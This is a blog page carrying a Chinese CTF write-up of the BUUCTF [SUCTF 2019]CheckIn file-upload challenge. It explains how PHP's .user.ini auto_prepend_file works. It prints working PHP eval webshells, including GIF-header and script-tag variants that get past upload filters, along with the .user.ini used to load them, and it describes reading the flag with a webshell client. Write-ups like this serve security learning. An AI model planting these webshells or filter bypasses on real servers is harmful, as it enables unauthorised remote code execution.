@@ -1,0 +1,211 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>buuctf6 - 林北</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[SUCTF 2019]CheckIn打开容器，发现是一道文件上传的题，那么根据我们的金典配方，第一步就是上传后缀为gif的木马webshell.gif：
+1&amp;lt;?php @eval($_POS,"> 
+    <meta name="author" content="linbei"> 
+    
+    <link rel="icon" href="/img/3.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="林北" type="application/atom+xml">
+</head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">林北</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">buuctf6</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">buuctf6</h1>
+        <div class="stuff">
+            <span>七月 14, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>打开容器，发现是一道文件上传的题，那么根据我们的金典配方，第一步就是上传后缀为gif的木马webshell.gif：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后抓包改为php，</p>
+<p><img src="/2021/07/14/buuctf6/image-20210717104127644.png" alt="image-20210717104127644">无效后缀，说明服务器端也检测了文件后缀，然后我接着试了phtml，php3等变形后缀都不能绕过，而且他这里都不能上传的原因都是后缀不合法，我就有点难受了，看了wp发现之前upload-lab刷的关于<code>.user.ini</code>的内容都忘光了。</p>
+<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p><code>php.ini</code>是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。</p>
+<p><img src="/2021/07/14/buuctf6/image-20210717105827172.png" alt="image-20210717105827172"></p>
+<p>实际上，除了<code>PHP_INI_SYSTEM</code>和<code>PHP_INI_ALL</code>以外的模式都是可以通过.user.ini来设置的。</p>
+<h5 id="下面这段话是关于PHP识别ini文件的规则："><a href="#下面这段话是关于PHP识别ini文件的规则：" class="headerlink" title="下面这段话是关于PHP识别ini文件的规则："></a>下面这段话是关于PHP识别ini文件的规则：</h5><p>PHP 除了扫描主 <code>php.ini</code> 之外，还会在每个目录下扫描 ini 文件，从被执行的 php 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 php 文件在 web 根目录之外，则只扫描该目录。</p>
+<h6 id="我们这样理解这段话：当被执行的-php-文件在-web-根目录之外时，PHP先只会扫描-被执行php文件所在的目录下是否存在ini文件，如果存在的话-就会按照这个user-ini对这个目录进行配置；然后PHP向上一级目录扫描重复上述操作直至扫描到根目录。"><a href="#我们这样理解这段话：当被执行的-php-文件在-web-根目录之外时，PHP先只会扫描-被执行php文件所在的目录下是否存在ini文件，如果存在的话-就会按照这个user-ini对这个目录进行配置；然后PHP向上一级目录扫描重复上述操作直至扫描到根目录。" class="headerlink" title="我们这样理解这段话：当被执行的 php 文件在 web 根目录之外时，PHP先只会扫描 被执行php文件所在的目录下是否存在ini文件，如果存在的话 就会按照这个user.ini对这个目录进行配置；然后PHP向上一级目录扫描重复上述操作直至扫描到根目录。"></a>我们这样理解这段话：当被执行的 php 文件在 web 根目录之外时，PHP先只会扫描 被执行php文件所在的目录下是否存在ini文件，如果存在的话 就会按照这个user.ini对这个目录进行配置；然后PHP向上一级目录扫描重复上述操作直至扫描到根目录。</h6><h5 id="配置文件的利用："><a href="#配置文件的利用：" class="headerlink" title="配置文件的利用："></a>配置文件的利用：</h5><p><code>php.ini</code>中的配置项中很多敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。都是我们还是找到两个可以用来利用的配置项（下图的一和四）</p>
+<p><img src="/2021/07/14/buuctf6/image-20210717110429438.png" alt="image-20210717110429438"></p>
+<p><strong>auto_prepend_file：</strong>指定一个文件，自动包含在要执行的文件前，类似于在<strong>文件前</strong>调用了require()函数。</p>
+<p><strong>auto_append_file：</strong>与<code>auto_prepend_file</code>配置项功能类似，只是在文件后面包含。 </p>
+<p>使用方法很简单，直接写在.user.ini中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;webshell.gif</span><br></pre></td></tr></table></figure>
+
+
+
+<p>因此懂得了<code>.user.ini</code>的利用，这题的思路就打开了，但是要注意的是利用的前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。因此我们先验证一下我们上传的文件夹内是否存在php文件，然后我上传了很多个文件</p>
+<p><img src="/2021/07/14/buuctf6/image-20210717180500162.png" alt="image-20210717180500162"></p>
+<p>发现上传的文件夹中存在index.php，那么我们就可以放心的利用啦</p>
+<p>我们先上传一个我们的.user.ini  ，但是他这里存在文件头内容检查，因此我们加上gif文件头修饰：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;webshell.gif</span><br></pre></td></tr></table></figure>
+
+<p>上传成功</p>
+<p><img src="/2021/07/14/buuctf6/image-20210717175245869.png" alt="image-20210717175245869"></p>
+<p>接着上传我们的一句话木马webshell.gif：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现它过滤了<code>&lt;?</code>，因此再对我们的一句话木马改写webshell2.gif：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;pass&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传成功</p>
+<p><img src="/2021/07/14/buuctf6/image-20210717175259925.png" alt="image-20210717175259925"></p>
+<p>这边有一点要注意的是我把修改后的木马改名为了webshell2.gif，所以<code>.user.ini</code>内对应的文件名也要进行改写</p>
+<p>全部上传成功以后，有两种方法可以获取flag。</p>
+<p><strong>第一种</strong>用蚁剑连接，再打开虚拟终端，输入指令<code>cat /flag</code></p>
+<p><img src="/2021/07/14/buuctf6/image-20210717181245508.png" alt="image-20210717181245508"></p>
+<p><strong>sp：</strong>这边还有一点需要注意，服务器会定期删除上传的文件以确保服务器安全，所以我们要尽快连接蚁剑，完成操作。</p>
+<p><strong>第二种</strong>就是直接传参，post我们写的一句话木马对应的变量，扫描根目录并以数组方式回显输出文件名<img src="/2021/07/14/buuctf6/image-20210717200923303.png" alt="image-20210717200923303"></p>
+<p><img src="/2021/07/14/buuctf6/image-20210717201113683.png"></p>
+<p>我们看到存在flag文件，尝试读取它：<img src="/2021/07/14/buuctf6/image-20210717201906697.png" alt="image-20210717201906697"></p>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.list.php">https://www.php.net/manual/zh/ini.list.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102688564">https://blog.csdn.net/weixin_44077544/article/details/102688564</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/113623796">https://blog.csdn.net/RABCDXB/article/details/113623796</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
